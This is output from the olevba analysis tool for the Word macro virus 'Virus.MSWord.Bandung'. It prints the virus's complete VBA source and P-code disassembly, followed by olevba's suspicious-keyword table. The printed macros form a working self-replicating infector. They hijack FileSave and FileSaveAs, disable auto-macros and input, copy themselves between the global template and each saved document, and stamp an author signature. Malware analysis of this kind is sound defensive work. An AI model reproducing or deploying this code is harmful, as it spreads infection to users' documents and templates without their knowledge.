olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bandung
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bandung - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Bandung - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim Filebaru$, FileMacro$
Dim salah

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file "
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Filebaru$ = ""
FileMacro$ = ""
salah = 0
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
On Error GoTo -1: On Error GoTo finish
FileMacro$ = WordBasic.[MacroFileName$]()
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
Filebaru$ = WordBasic.[FileName$]()
CopyToFile
If salah <> 0 Then CopyToGlobal
Aksi
WordBasic.FileSaveAs dlg
finish:
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyAOF
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSaveAs", Filebaru$ + ":FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyToGlobal()
On Error GoTo -1: On Error GoTo fin
CopyAOtoG
WordBasic.MacroCopy FileMacro$ + ":FileSaveAs", "Global:FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyAOtoG()
On Error GoTo -1: On Error GoTo finish
WordBasic.MacroCopy FileMacro$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyAOF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSave", Filebaru$ + ":AutoOpen", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT"
WordBasic.SetDocumentVar "Dzutaqshiri", "(c)Hikmat Sudrajat, Bandung, April 1996"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Bandung - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim formatfile, salah
Dim Filebaru$, Cek$

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
formatfile = 0
salah = 0
Filebaru$ = ""
Cek$ = ""
NoAuto
On Error GoTo -1: On Error GoTo finish
Cek$ = WordBasic.[FileNameFromWindow$]()
If WordBasic.IsMacro() Then
    WordBasic.FileSave
    GoTo finish
End If
ulang:
SaveTo
If salah = 1059 Then
    Cek$ = ""
    GoTo ulang
End If
finish:
If Err.Number = 509 Then PrintDisable
End Sub

Private Sub NoAuto()
On Error GoTo -1: On Error GoTo finish
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
finish:
End Sub

Private Sub SaveTo()
On Error GoTo -1: On Error GoTo finish
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If Cek$ = "" Then WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
formatfile = dlg.Format
Filebaru$ = WordBasic.[FileName$]()
If formatfile = 1 Then CopyToFile
If salah = 0 Then
    If formatfile = 1 Then Aksi
    WordBasic.FileSaveAs dlg
End If
finish:
salah = Err.Number
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyFSAF
End If
If salah <> 0 Then
    CopyFSG
    CopyFSAG
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSave", Filebaru$ + ":AutoOpen", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyFSG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyFSAG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":FileSaveAs", "Global:FileSaveAs", 1
finish:
End Sub

Private Sub CopyFSAF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSaveAs", Filebaru$ + ":FileSaveAs", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT"
WordBasic.SetDocumentVar "Dzutaqshiri", "(c)Hikmat Sudrajat, Bandung, April 1996"
finish:
End Sub

Private Sub PrintDisable()
On Error GoTo -1: On Error GoTo finish
WordBasic.PrintStatusBar "This command is not available because a document window is not active"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bandung
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSaveAs - 5861 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn Filebaru
' 	VarDefn FileMacro
' Line #2:
' 	Dim 
' 	VarDefn salah
' Line #3:
' Line #4:
' 	FuncDefn (Public Sub MAIN())
' Line #5:
' 	LitStr 0x0000 ""
' 	St Filebaru$ 
' Line #6:
' 	LitStr 0x0000 ""
' 	St FileMacro$ 
' Line #7:
' 	LitDI2 0x0000 
' 	St salah 
' Line #8:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #9:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	St FileMacro$ 
' Line #12:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #14:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #15:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St Filebaru$ 
' Line #17:
' 	ArgsCall CopyToFile 0x0000 
' Line #18:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CopyToGlobal 0x0000 
' 	EndIf 
' Line #19:
' 	ArgsCall Aksi 0x0000 
' Line #20:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #21:
' 	Label finish 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' 	FuncDefn (Private Sub CopyToFile())
' Line #25:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #26:
' 	ArgsCall CekCopyToFile 0x0000 
' Line #27:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	ArgsCall CopyAOF 0x0000 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label finish 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub CekCopyToFile())
' Line #34:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError fin 
' Line #35:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld Filebaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #36:
' 	Label fin 
' Line #37:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Private Sub CopyToGlobal())
' Line #41:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError fin 
' Line #42:
' 	ArgsCall CopyAOtoG 0x0000 
' Line #43:
' 	Ld FileMacro$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #44:
' 	Label fin 
' Line #45:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Private Sub CopyAOtoG())
' Line #49:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #50:
' 	Ld FileMacro$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #51:
' 	Label finish 
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Private Sub CopyAOF())
' Line #55:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #56:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld Filebaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #57:
' 	Label finish 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub Aksi())
' Line #61:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #62:
' 	LitStr 0x0003 "DZT"
' 	ParamNamed Comments 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #63:
' 	LitStr 0x000B "Dzutaqshiri"
' 	LitStr 0x0027 "(c)Hikmat Sudrajat, Bandung, April 1996"
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #64:
' 	Label finish 
' Line #65:
' 	EndSub 
' Macros/VBA/AutoOpen - 7492 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn formatfile
' 	VarDefn salah
' Line #2:
' 	Dim 
' 	VarDefn Filebaru
' 	VarDefn Cek
' Line #3:
' Line #4:
' 	FuncDefn (Public Sub MAIN())
' Line #5:
' 	LitDI2 0x0000 
' 	St formatfile 
' Line #6:
' 	LitDI2 0x0000 
' 	St salah 
' Line #7:
' 	LitStr 0x0000 ""
' 	St Filebaru$ 
' Line #8:
' 	LitStr 0x0000 ""
' 	St Cek$ 
' Line #9:
' 	ArgsCall NoAuto 0x0000 
' Line #10:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	St Cek$ 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0000 
' 	IfBlock 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #14:
' 	GoTo finish 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Label ulang 
' Line #17:
' 	ArgsCall SaveTo 0x0000 
' Line #18:
' 	Ld salah 
' 	LitDI2 0x0423 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitStr 0x0000 ""
' 	St Cek$ 
' Line #20:
' 	GoTo ulang 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Label finish 
' Line #23:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x01FD 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall PrintDisable 0x0000 
' 	EndIf 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Private Sub NoAuto())
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #28:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #29:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #30:
' 	Label finish 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub SaveTo())
' Line #34:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #35:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #36:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #37:
' 	Ld Cek$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	EndIf 
' Line #38:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #39:
' 	Ld dlg 
' 	MemLd Format$ 
' 	St formatfile 
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St Filebaru$ 
' Line #41:
' 	Ld formatfile 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CopyToFile 0x0000 
' 	EndIf 
' Line #42:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld formatfile 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Aksi 0x0000 
' 	EndIf 
' Line #44:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label finish 
' Line #47:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub CopyToFile())
' Line #51:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #52:
' 	ArgsCall CekCopyToFile 0x0000 
' Line #53:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #54:
' 	ArgsCall CopyFSAF 0x0000 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #57:
' 	ArgsCall CopyFSG 0x0000 
' Line #58:
' 	ArgsCall CopyFSAG 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Label finish 
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
' 	FuncDefn (Private Sub CekCopyToFile())
' Line #64:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError fin 
' Line #65:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld Filebaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #66:
' 	Label fin 
' Line #67:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Private Sub CopyFSG())
' Line #71:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #72:
' 	Ld Filebaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #73:
' 	Label finish 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Private Sub CopyFSAG())
' Line #77:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #78:
' 	Ld Filebaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #79:
' 	Label finish 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Private Sub CopyFSAF())
' Line #83:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #84:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld Filebaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #85:
' 	Label finish 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' 	FuncDefn (Private Sub Aksi())
' Line #89:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #90:
' 	LitStr 0x0003 "DZT"
' 	ParamNamed Comments 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #91:
' 	LitStr 0x000B "Dzutaqshiri"
' 	LitStr 0x0027 "(c)Hikmat Sudrajat, Bandung, April 1996"
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #92:
' 	Label finish 
' Line #93:
' 	EndSub 
' Line #94:
' Line #95:
' 	FuncDefn (Private Sub PrintDisable())
' Line #96:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #97:
' 	LitStr 0x0045 "This command is not available because a document window is not active"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #98:
' 	Label finish 
' Line #99:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

